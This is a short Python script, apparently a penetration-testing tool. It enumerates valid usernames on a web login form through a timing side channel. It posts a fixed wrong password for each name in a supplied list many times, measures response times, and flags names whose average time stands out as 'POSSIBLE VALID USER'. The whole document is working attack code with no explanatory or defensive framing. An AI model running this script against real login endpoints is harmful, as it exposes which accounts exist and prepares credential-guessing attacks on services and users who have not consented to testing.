import requests
import time
import statistics
import argparse

def measure_time(session, url, data, headers):
    start = time.perf_counter()
    session.post(url, data=data, headers=headers)
    return time.perf_counter() - start

def analyze_user(session, url, username, password, headers, iterations):
    timings = []
    for _ in range(iterations):
        data = {
            "username": username,
            "password": password
        }
        timings.append(measure_time(session, url, data, headers))
    return timings

def main():
    parser = argparse.ArgumentParser(description="Login timing pattern analyzer")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-U", "--users", required=True)
    parser.add_argument("-p", "--password", default="InvalidPassword123!")
    parser.add_argument("-n", "--iterations", type=int, default=10)
    parser.add_argument("--threshold", type=float, default=2.0,
                        help="Std deviation multiplier to flag anomalies")
    args = parser.parse_args()

    session = requests.Session()
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    results = {}

    with open(args.users) as f:
        for user in f:
            user = user.strip()
            timings = analyze_user(
                session,
                args.url,
                user,
                args.password,
                headers,
                args.iterations
            )
            avg = statistics.mean(timings)
            std = statistics.stdev(timings) if len(timings) > 1 else 0
            results[user] = {
                "avg": avg,
                "std": std,
                "raw": timings
            }

    global_avg = statistics.mean([v["avg"] for v in results.values()])
    global_std = statistics.stdev([v["avg"] for v in results.values()])

    print("\n=== Timing Analysis Results ===\n")
    print(f"Global average: {global_avg:.4f}s | Global std: {global_std:.4f}s\n")

    for user, data in results.items():
        deviation = (data["avg"] - global_avg) / global_std if global_std else 0
        flag = "⚠️ POSSIBLE VALID USER" if deviation > args.threshold else ""
        print(f"{user:20} avg={data['avg']:.4f}s std={data['std']:.4f}s {flag}")

if __name__ == "__main__":
    main()
